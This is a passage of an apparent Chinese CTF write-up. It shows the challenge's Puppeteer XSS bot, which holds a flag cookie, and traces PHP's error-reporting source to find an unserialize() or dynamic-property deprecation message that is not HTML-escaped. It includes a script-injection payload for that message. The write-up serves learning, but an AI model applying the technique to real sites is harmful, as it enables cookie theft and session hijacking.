+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;flag{test_flag}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="o">?</span><span class="p">.</span><span class="nx">BOT_PORT</span> <span class="o">||</span> <span class="mi">31337</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/report&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">url</span> <span class="o">||</span> <span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;http://challenge/&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Invalid URL&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[+] Visiting: </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">headless</span><span class="o">:</span> <span class="s1">&#39;new&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">args</span><span class="o">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;--no-sandbox&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;--disable-setuid-sandbox&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">setCookie</span><span class="p">({</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="o">:</span> <span class="nx">flag</span><span class="p">,</span> <span class="nx">domain</span><span class="o">:</span> <span class="s1">&#39;challenge&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> <span class="nx">waitUntil</span><span class="o">:</span> <span class="s1">&#39;networkidle2&#39;</span><span class="p">,</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">5000</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForNetworkIdle</span><span class="p">({</span><span class="nx">timeout</span><span class="o">:</span> <span class="mi">5000</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;URL visited by bot!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`[!] Error visiting URL:`</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Bot error visiting URL&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;h2&gt;XSS Bot&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;form method=&#34;POST&#34; action=&#34;/report&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;input type=&#34;text&#34; name=&#34;url&#34; value=&#34;http://challenge/?data=...&#34; style=&#34;width: 500px;&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;button type=&#34;submit&#34;&gt;Submit&lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  `</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`XSS bot running at port </span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是用data传参打xss,而php代码非常简单，只有反序列化，想到打Error类似的原生类来xss,但是这种打法需要代码有echo来触发内置的<code>toString</code>,所以显然不行</p>
+<p>直接开启index.php那个靶机会有报错</p>
+<p><img src="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710172059546.png"
+	width="922"
+	height="277"
+	srcset="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710172059546_hu9757029636465570308.png 480w, /p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710172059546_hu7408108138072796875.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250710172059546"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="332"
+		data-flex-basis="798px"
+	
+></p>
+<p>我们直接搜索<code>php unserialize error</code>关键词，直接找到这篇文章</p>
+<p>[<a class="link" href="https://wiki.php.net/rfc/improve_unserialize_error_handling"  target="_blank" rel="noopener"
+    >PHP RFC: Improve unserialize() error handling</a>]</p>
+<p>里面介绍了四种报错</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">);</span> <span class="c1">// Notice: unserialize(): Error at offset 0 of 3 bytes in php-src/test.php on line 3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;i:12345678901234567890;&#39;</span><span class="p">);</span> <span class="c1">// Warning: unserialize(): Numerical result out of range in php-src/test.php on line 4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;E:3:&#34;foo&#34;;&#39;</span><span class="p">);</span> <span class="c1">// Warning: unserialize(): Invalid enum name &#39;foo&#39; (missing colon) in php-src/test.php on line 5
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                           <span class="c1">// Notice: unserialize(): Error at offset 0 of 10 bytes in php-src/test.php on line 5
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;E:3:&#34;fo:&#34;;&#39;</span><span class="p">);</span> <span class="c1">// Warning: unserialize(): Class &#39;fo&#39; not found in php-src/test.php on line 7
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                           <span class="c1">// Notice: unserialize(): Error at offset 0 of 10 bytes in php-src/test.php on line 7
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;E:3:&#34;foo&#34;;&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;E:3:&#34;fo:&#34;;&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这种类型的报错信息我们是可控的,直接尝试xss</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">E:39:&#34;&lt;script&gt;alert(document.domain)&lt;/script&gt;&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没触发，报错信息如下</p>
+<p><img src="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710172758780.png"
+	width="1181"
+	height="251"
+	srcset="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710172758780_hu2761016403074717784.png 480w, /p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710172758780_hu316223353783186795.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250710172758780"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="470"
+		data-flex-basis="1129px"
+	
+></p>
+<p>curl发现<code>&lt;&gt;</code>标签被html转义了，在<code>docker-compose.yml</code>,我们php版本是php:8-apache</p>
+<p>去docker官网查看版本[<a class="link" href="https://hub.docker.com/layers/library/php/8-apache/images/sha256-4e97cb42a25019c4e8ceec170a46984f63079f5b371d24e23a41f5397934ea31"  target="_blank" rel="noopener"
+    >Docker image php:8-apache</a>]</p>
+<p><code>php8.4.10</code>,直接跟进源码找报错信息<code>Invalid enum name</code>相关的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;E:&#34;</span> <span class="nx">uiv</span> <span class="s2">&#34;:&#34;</span> <span class="p">[</span><span class="s2">&#34;] {
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [...]
+</span></span></span><span class="line"><span class="cl"><span class="s2">  char *colon_ptr = memchr(str, &#39;:&#39;, len);
+</span></span></span><span class="line"><span class="cl"><span class="s2">  if (colon_ptr == NULL) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    php_error_docref(NULL, E_WARNING, &#34;</span><span class="nx">Invalid</span> <span class="nx">enum</span> <span class="nx">name</span> <span class="s1">&#39;%.*s&#39;</span> <span class="p">(</span><span class="nx">missing</span> <span class="nx">colon</span><span class="p">)</span><span class="s2">&#34;, (int) len, str);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    return 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  }
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进<code>php_error_docref</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">PHPAPI</span> <span class="nx">ZEND_COLD</span> <span class="nx">void</span> <span class="nx">php_error_docref</span><span class="p">(</span><span class="k">const</span> <span class="no">char</span> <span class="o">*</span><span class="nx">docref</span><span class="p">,</span> <span class="nx">int</span> <span class="nx">type</span><span class="p">,</span> <span class="k">const</span> <span class="no">char</span> <span class="o">*</span><span class="nx">format</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">php_error_docref_impl</span><span class="p">(</span><span class="nx">docref</span><span class="p">,</span> <span class="nx">type</span><span class="p">,</span> <span class="nx">format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进<code>php_error_docref_impl</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/* {{{ php_error_docref */</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* Generate an error which links to docref or the php.net documentation if docref is NULL */</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#define php_error_docref_impl(docref, type, format) do {\
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">va_list</span> <span class="nx">args</span><span class="p">;</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">va_start</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="nx">format</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">php_verror</span><span class="p">(</span><span class="nx">docref</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">type</span><span class="p">,</span> <span class="nx">format</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">va_end</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进<code>php_verror</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">zend_string</span> <span class="o">*</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">vstrpprintf</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">format</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">PG</span><span class="p">(</span><span class="nx">html_errors</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">zend_string</span> <span class="o">*</span><span class="nx">replace_buffer</span> <span class="o">=</span> <span class="nx">escape_html</span><span class="p">(</span><span class="nx">ZSTR_VAL</span><span class="p">(</span><span class="nx">buffer</span><span class="p">),</span> <span class="nx">ZSTR_LEN</span><span class="p">(</span><span class="nx">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">zend_string_free</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">replace_buffer</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">replace_buffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">zend_empty_string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进<code>escape_html</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">static</span> <span class="nx">zend_string</span> <span class="o">*</span><span class="nx">escape_html</span><span class="p">(</span><span class="k">const</span> <span class="no">char</span> <span class="o">*</span><span class="nx">buffer</span><span class="p">,</span> <span class="nx">size_t</span> <span class="nx">buffer_len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">zend_string</span> <span class="o">*</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">php_escape_html_entities_ex</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">const</span> <span class="no">unsigned</span> <span class="nx">char</span> <span class="o">*</span><span class="p">)</span> <span class="nx">buffer</span><span class="p">,</span> <span class="nx">buffer_len</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ENT_COMPAT</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* charset_hint */</span> <span class="k">NULL</span><span class="p">,</span> <span class="cm">/* double_encode */</span> <span class="mi">1</span><span class="p">,</span> <span class="cm">/* quiet */</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">result</span> <span class="o">||</span> <span class="nx">ZSTR_LEN</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Retry with substituting invalid chars on fail. */</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">result</span> <span class="o">=</span> <span class="nx">php_escape_html_entities_ex</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="k">const</span> <span class="no">unsigned</span> <span class="nx">char</span> <span class="o">*</span><span class="p">)</span> <span class="nx">buffer</span><span class="p">,</span> <span class="nx">buffer_len</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ENT_COMPAT</span> <span class="o">|</span> <span class="nx">ENT_HTML_SUBSTITUTE_ERRORS</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* charset_hint */</span> <span class="k">NULL</span><span class="p">,</span> <span class="cm">/* double_encode */</span> <span class="mi">1</span><span class="p">,</span> <span class="cm">/* quiet */</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以结论就是<code>php_error_docref</code>函数最终就是会将输入的字符转义</p>
+<p>搜索<code>error</code>相关函数</p>
+<ul>
+<li>php_error</li>
+<li>php_error_docref</li>
+<li>php_error_docref1</li>
+<li>php_error_docref2</li>
+<li>zend_error</li>
+<li>php_verror</li>
+</ul>
+<p>由于前面的基本都跟进过了，我们跟进<code>zend_error</code>看看，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">ZEND_API</span> <span class="nx">ZEND_COLD</span> <span class="nx">void</span> <span class="nx">zend_error</span><span class="p">(</span><span class="nx">int</span> <span class="nx">type</span><span class="p">,</span> <span class="k">const</span> <span class="no">char</span> <span class="o">*</span><span class="nx">format</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">zend_error_impl</span><span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="nx">format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样是不断跟进</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#define zend_error_impl(type, format) do { \
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">zend_string</span> <span class="o">*</span><span class="nx">filename</span><span class="p">;</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">uint32_t</span> <span class="nx">lineno</span><span class="p">;</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">va_list</span> <span class="nx">args</span><span class="p">;</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">get_filename_lineno</span><span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">filename</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">lineno</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">va_start</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="nx">format</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">zend_error_va_list</span><span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="nx">filename</span><span class="p">,</span> <span class="nx">lineno</span><span class="p">,</span> <span class="nx">format</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">va_end</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span> <span class="nx">\</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">static</span> <span class="nx">ZEND_COLD</span> <span class="nx">void</span> <span class="nx">zend_error_va_list</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">int</span> <span class="nx">orig_type</span><span class="p">,</span> <span class="nx">zend_string</span> <span class="o">*</span><span class="nx">error_filename</span><span class="p">,</span> <span class="nx">uint32_t</span> <span class="nx">error_lineno</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">char</span> <span class="o">*</span><span class="nx">format</span><span class="p">,</span> <span class="nx">va_list</span> <span class="nx">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">zend_string</span> <span class="o">*</span><span class="nx">message</span> <span class="o">=</span> <span class="nx">zend_vstrpprintf</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">format</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">zend_error_zstr_at</span><span class="p">(</span><span class="nx">orig_type</span><span class="p">,</span> <span class="nx">error_filename</span><span class="p">,</span> <span class="nx">error_lineno</span><span class="p">,</span> <span class="nx">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">zend_string_release</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后得到它的报错信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">zend_error</span><span class="p">(</span><span class="nx">E_DEPRECATED</span><span class="p">,</span> <span class="s2">&#34;Creation of dynamic property %s::$%s is deprecated&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">ZSTR_VAL</span><span class="p">(</span><span class="nx">obj</span><span class="o">-&gt;</span><span class="na">ce</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">),</span> <span class="nx">zend_get_unmangled_property_name</span><span class="p">(</span><span class="nx">Z_STR_P</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">key</span><span class="p">)));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显然它不会进行转义，想办法造成报错，然后填参数就能xss</p>
+<p>根据这篇[<a class="link" href="https://php.watch/versions/8.2/dynamic-properties-deprecated"  target="_blank" rel="noopener"
+    >this PHP.Watch post</a>]</p>
+<p>PHP类可以动态设置和获取未在类中声明的类属性。然而，从PHP 8.2版及以上版本开始，不建议将值设置为未声明的类属性。应该说是直接废弃了这种办法，如果我们获取就会抛出报错</p>
+<p>文章给了一个demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
